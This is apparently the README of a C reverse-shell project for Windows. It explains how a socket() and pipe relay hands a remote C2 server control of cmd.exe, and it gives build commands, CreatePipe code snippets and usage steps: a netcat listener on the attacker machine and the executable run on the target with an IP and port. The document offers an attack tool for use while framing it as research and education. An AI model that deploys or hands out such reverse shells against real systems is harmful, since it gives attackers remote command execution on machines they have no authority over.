# ReverseShellPipe (C)

> ⚠️ **仅供安全研究和教育目的使用，请在隔离环境中测试**

这是使用 `socket()` + 管道方案实现的反弹 shell，演示了当无法直接将 socket 作为句柄传递时的替代方案。

## 与 ReverseShell 的区别

| 特性 | ReverseShell | ReverseShellPipe |
|------|--------------|------------------|
| 网络 API | `WSASocket()` | `socket()` |
| IO 重定向 | socket 直接作为句柄 | 管道中转 |
| 线程数 | 单线程 | 多线程（2个转发线程） |
| 代码复杂度 | 简单 | 较复杂 |
| 文件大小 | ~15KB | ~18KB |

## 为什么需要管道方案？

`socket()` 创建的套接字不能直接转换为 `HANDLE` 传给 `CreateProcess`，因为：

- `socket()` 返回的是 Winsock 内部的描述符
- `WSASocket()` 返回的套接字兼容 Windows 句柄

所以需要用管道作为中介：

```shell
C2 Server <---> socket() <---> 管道 <---> cmd.exe
                   │              │
            SocketToPipe()  PipeToSocket()
               (线程1)        (线程2)
```

## 编译

```bash
# macOS 需要先安装 mingw-w64
brew install mingw-w64

# 编译
chmod +x build.sh
./build.sh
```

## 使用

```bash
# 攻击机监听
nc -lvnp 4444

# 靶机执行
reverse_shell_pipe_win64.exe              # 默认 127.0.0.1:4444
reverse_shell_pipe_win64.exe 192.168.1.1  # 指定 IP
reverse_shell_pipe_win64.exe 192.168.1.1 8888  # 指定 IP 和端口
```

## 项目结构

```
C/ReverseShellPipe/
├── main.c       # 主程序（socket + 管道方案）
├── build.sh     # 编译脚本
├── README.md    # 说明文档
└── bin/
    ├── reverse_shell_pipe_win64.exe
    └── reverse_shell_pipe_win32.exe
```

## 技术要点

### 管道创建

```c
// stdin 管道：C2 命令 -> cmd.exe
CreatePipe(&hChildStdinRead, &hChildStdinWrite, &sa, 0);

// stdout 管道：cmd.exe 输出 -> C2
CreatePipe(&hChildStdoutRead, &hChildStdoutWrite, &sa, 0);
```

### 线程转发

- **SocketToPipe**: `recv()` → `WriteFile()`
- **PipeToSocket**: `ReadFile()` → `send()`

## 免责声明

本项目仅供安全研究和学习，严禁用于非法目的。
